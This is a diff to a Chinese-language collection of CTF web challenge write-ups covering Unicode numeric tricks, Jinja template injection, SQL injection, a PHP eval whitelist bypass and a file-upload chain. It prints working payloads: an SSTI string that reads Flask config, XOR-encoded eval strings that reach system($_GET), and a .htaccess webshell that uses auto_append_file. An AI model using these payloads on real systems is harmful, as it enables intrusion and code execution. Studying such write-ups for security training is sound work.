@@ -788,6 +788,340 @@ escapeshellarg+escapeshellcmd组合导致参数注入
 
 
 
+
+
+### Unicore shop
+
+ https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis 
+
+后端:tornado
+
+```
+<meta charset="utf-8"><!--Ah,really important,seriously. -->
+
+
+```
+
+
+
+
+
+24:`id = self.get_argument('id')`
+
+25:`price = str(self.get_argument('price'))`
+
+34:`unicodedata.numeric(price)`
+
+我们发现第4个商品要1000+而我们只能输入一个字符
+
+通过报错我们看到`unicodedata.numeric(price)`
+
+这个会把unicode的字符转成数字,如果有这么一个字符他代表1000以上的数字时,我们就可以拿到flag,百度一翻后,我们发现还真有,最后拿到flag
+
+
+
+ https://www.compart.com/en/unicode/search?q=thousand#characters 
+
+
+
+### shrine
+
+```python
+
+
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+app.config['FLAG'] = os.environ.pop('FLAG')
+
+
+@app.route('/')
+def index():
+    return open(__file__).read()
+
+
+@app.route('/shrine/<path:shrine>')
+def shrine(shrine):
+
+    def safe_jinja(s):
+        s = s.replace('(', '').replace(')', '')
+        blacklist = ['config', 'self']
+        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
+
+    return flask.render_template_string(safe_jinja(shrine))
+
+
+if __name__ == '__main__':
+    app.run(debug=True)
+
+```
+
+
+
+禁了括号和config和`__self__`,也就是不能命令执行
+
+flag在config里,也就是说我们要找到config
+
+刚开始不知道有啥没想到request,就一直在看`"".__class__`里翻来翻去,后来想到request就试了一下发现好东西
+
+`{{request.__class__.__mro__[-3].__dict__['json_module'].__dict__['current_app'].__dict__['config']}}`拿到flag
+
+ https://dormousehole.readthedocs.io/en/latest/templating.html 
+
+
+
+
+
+### web1
+
+广告申请广告名处存在sql注入,但是用union select 一直提示段数量不对,试了10多次后放弃了
+
+过滤报错注入,or,猜测后端是`str_replace("xxxxxx","+","")`然后判断or是否在里面
+
+消去空格,+
+
+php5.6尝试截断攻击,在申请广告处无效
+
+sql长度截断登陆admin账号,但是没用
+
+
+
+最后看wp发现tm有20+的字段(写脚本写到一半就放弃了),至于or被过滤无法查询字段名等,可以用
+
+```mysql
+select * from flags where id='abcdd' union select 1,(select group_concat(b,e,f,g) from ( select 1 as e,2 as f,3 as g,4 as b union select*from flags) x ),3,4;
+```
+
+来查询,现在就差表名了
+
+因为这是mariadb,可以用https://mariadb.com/kb/en/library/mysqlinnodb_table_stats/来查询表名
+
+
+
+
+
+### love math
+
+
+
+```php
+<?php
+error_reporting(0);
+//听说你很喜欢数学，不知道你是否爱它胜过爱flag
+if(!isset($_GET['c'])){
+    show_source(__FILE__);
+}else{
+    //例子 c=20-1
+    $content = $_GET['c'];
+    if (strlen($content) >= 80) {
+        die("太长了不会算");
+    }
+    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
+    foreach ($blacklist as $blackitem) {
+        if (preg_match('/' . $blackitem . '/m', $content)) {
+            die("请不要输入奇奇怪怪的字符");
+        }
+    }
+    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
+    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
+    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
+    foreach ($used_funcs[0] as $func) {
+        if (!in_array($func, $whitelist)) {
+            die("请不要输入奇奇怪怪的函数");
+        }
+    }
+    //帮你算出答案
+    eval('echo '.$content.';');
+}
+```
+
+
+
+
+
+c中只能出现部分字符,或者白名单中的单词
+
+查看白名单中的每一个函数发现baseconvert可以绕过字母和无引号的限制(刚开始没有认真导致自己卡住了很久)
+
+```
+baseconvert
+返回一字符串，包含 number 以 tobase 进制的表示。number 本身的进制由 frombase 指定。frombase 和 tobase 都只能在 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。 
+```
+
+`$pi=base_convert;$pi(55490343972,10,36)();`
+
+字符扩展到a-z0-9,用system看了一下当前目录,没有,
+
+想要看根目录,发现长度不够(/和空格)
+
+于是利用^来生成`_GET`,得到`system($_GET)`
+
+
+
+最后的payload:`$pi=base_convert;$pi(1751504350,10,36)(${$pi(1115654,10,36)^((100).(1))}{1});`
+
+
+
+### EasyWeb
+
+
+
+#### 第一步 命令执行
+
+```php
+<?php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+
+$hhh = @$_GET['_'];
+
+if (!$hhh){
+    highlight_file(__FILE__);
+}
+
+if(strlen($hhh)>18){
+    die('One inch long, one inch strong!');
+}
+
+if ( preg_match('/[\x00- 0-9A-Za-z\'"\`~_&.,|=[\x7F]+/i', $hhh) )
+    die('Try something else!');
+
+$character_type = count_chars($hhh, 3);
+if(strlen($character_type)>12) die("Almost there!");
+
+eval($hhh);
+?>
+```
+
+
+
+看样子是要调用`get_the_flag`这个函数,再进行下一步
+
+可用字符:
+
+```
+!#$%()*+-/:;<>?@\]^{}\x80-\xff
+```
+
+看这些字符,觉得最有可能的突破点是`$`
+
+关于变量名有以下正则
+
+`[a-zA-Z_\x7f-\xff][a-zA-Z0-9_\x7f-\xff]*`
+
+还有可变变量:`${'_GET'}=$_GET`
+
+先以执行任意一个命令为目标
+
+
+
+看到`^`再结合`\x80-\xff`就可以构造任何语句了
+
+构造类似`'(%ff%ff%ff%ff%ff^%xxxxxxxxxx)();'`来执行命令,但是这样的话函数名必须小于7个
+
+
+
+冥思苦想最后把上面三个结合在一起得到:
+
+`_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%ff}();`=>`$_GET['\xff']();`
+
+
+
+#### 第二步 文件上传
+
+
+
+进入下一步,文件上传
+
+```php
+function get_the_flag(){
+    // webadmin will remove your upload file every 20 min!!!! 
+    $userdir = "upload/tmp_".md5($_SERVER['REMOTE_ADDR']);
+    if(!file_exists($userdir)){
+    mkdir($userdir);
+    }
+    if(!empty($_FILES["file"])){
+        $tmp_name = $_FILES["file"]["tmp_name"];
+        $name = $_FILES["file"]["name"];
+        $extension = substr($name, strrpos($name,".")+1);
+    if(preg_match("/ph/i",$extension)) die("^_^"); 
+        if(mb_strpos(file_get_contents($tmp_name), '<?')!==False) die("^_^");
+    if(!exif_imagetype($tmp_name)) die("^_^"); 
+        $path= $userdir."/".$name;
+        @move_uploaded_file($tmp_name, $path);
+        print_r($path);
+    }
+}
+```
+
+
+
+对文件的后缀名进行了限制:`不能以ph结尾`
+
+对内容进行了限制:`不能出现<?`
+
+根据phpinfo得到的信息
+
+```
+版本:7.2.19
+中间件:Apache/2.4.29 
+
+```
+
+想到了用.htaccess/.user.ini文件来绕过,但是前面不得不附加内容(exif_imagetype)
+
+于是尝试寻找文件头是htaccess注释符(#和\x00)的图片类型
+
+根据[源代码]( https://github.com/php/php-src/blob/e219ec144ef6682b71e135fd18654ee1bb4676b4/ext/standard/image.c )发现`wbmp`的文件头是\x00\x00刚好符合我们的需求
+
+还有一个需要绕过的地方:对上传内容的限制,php7关闭asptag了,所以无法用<% %>来绕过
+
+后来找到一题类似的( https://xz.aliyun.com/t/3937 ),boarden my eye (是这样的把///)
+
+利用php伪协议+auto_append_file来绕过`<?`的限制
+
+
+
+```
+\x00\x00
+AddType application/x-httpd-php .wuwu
+php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.wuwu"
+```
+
+
+
+
+
+#### 第三步 绕过open_basedir
+
+
+
+php7.x,emmm还用说吗
+
+ https://github.com/mm0r1/exploits/tree/master/php7-gc-bypass 
+
+走你
+
+
+
 ## jarvisoj
 
 ### re?
@@ -1222,40 +1556,6 @@ while True:
     print(result)
 
 ```
-
-
-
-### Unicore shop
-
- https://github.com/hyperreality/ctf-writeups/tree/master/2019-asis 
-
-后端:tornado
-
-```
-<meta charset="utf-8"><!--Ah,really important,seriously. -->
-
-
-```
-
-
-
-
-
-24:`id = self.get_argument('id')`
-
-25:`price = str(self.get_argument('price'))`
-
-34:`unicodedata.numeric(price)`
-
-我们发现第4个商品要1000+而我们只能输入一个字符
-
-通过报错我们看到`unicodedata.numeric(price)`
-
-这个会把unicode的字符转成数字,如果有这么一个字符他代表1000以上的数字时,我们就可以拿到flag,百度一翻后,我们发现还真有,最后拿到flag
-
-
-
- https://www.compart.com/en/unicode/search?q=thousand#characters 
 
 
 
